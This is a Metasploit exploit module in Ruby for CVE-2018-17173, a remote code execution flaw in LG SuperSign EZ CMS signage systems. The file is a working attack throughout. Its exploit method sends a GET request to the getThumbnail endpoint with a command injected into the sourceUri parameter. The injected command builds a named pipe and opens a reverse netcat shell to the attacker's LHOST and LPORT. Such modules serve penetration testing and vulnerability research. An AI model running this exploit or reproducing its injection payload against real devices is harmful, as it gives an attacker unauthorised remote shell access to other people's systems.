# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
        &#039;Name&#039;        => &#039;LG Supersign EZ CMS RCE&#039;,
        &#039;Description&#039; => %q{
            		  LG SuperSignEZ CMS, that many LG SuperSign TVs have builtin, is prone
                          to remote code execution due to an improper parameter handling
        },
        &#039;Author&#039;      => [&#039;Alejandro Fanjul&#039;],
        &#039;References&#039;  =>
          [
            [ &#039;CVE&#039;, &#039;2018-17173&#039; ],
            [ &#039;URL&#039;, &#039;https://mamaquieroserpentester.blogspot.com/2018/09/lg-supersign-rce-to-luna-and-back-to.html&#039;]
          ],
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Platform&#039;       => &#039;unix&#039;,
        &#039;Privileged&#039;     => false,
        &#039;DefaultOptions&#039; =>
          {
            &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_netcat&#039;
          },
        &#039;Arch&#039;           => ARCH_CMD,
        &#039;Payload&#039;        =>
          {
            &#039;Compat&#039; =>
              {
                &#039;PayloadType&#039; => &#039;cmd&#039;,
                &#039;RequiredCmd&#039; => &#039;netcat&#039;
              }
          },
        &#039;Targets&#039;        =>
          [
            [ &#039;Automatic Target&#039;, {}]
          ],
        &#039;DefaultTarget&#039; => 0,
        &#039;DisclosureDate&#039; => &#039;Sep 21 2018&#039;
      )
     )
     register_options(
      [
         OptString.new(&#039;RPORT&#039;,[true,&#039;Target port&#039;,&#039;9080&#039;])
      ], self.class)

  end


  def exploit
    lhost=datastore[&#039;LHOST&#039;]
    lport=datastore[&#039;LPORT&#039;]
    #uri = target_uri.path
    cmd = Rex::Text.uri_encode(payload.encoded)
    connect
    res = send_request_raw({
        &#039;method&#039;=>&#039;GET&#039;,
        &#039;uri&#039;=>"/qsr_server/device/getThumbnail?sourceUri=&#039;%20-;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20"+lhost+"%20"+lport.to_s+"%20%3E%2Ftmp%2Ff;&#039;&targetUri=%2Ftmp%2Fthumb%2Ftest.jpg&mediaType=image&targetWidth=400&targetHeight=400&scaleType=crop&_=1537275717150"
        
    })    
    handler
    disconnect

  end

end

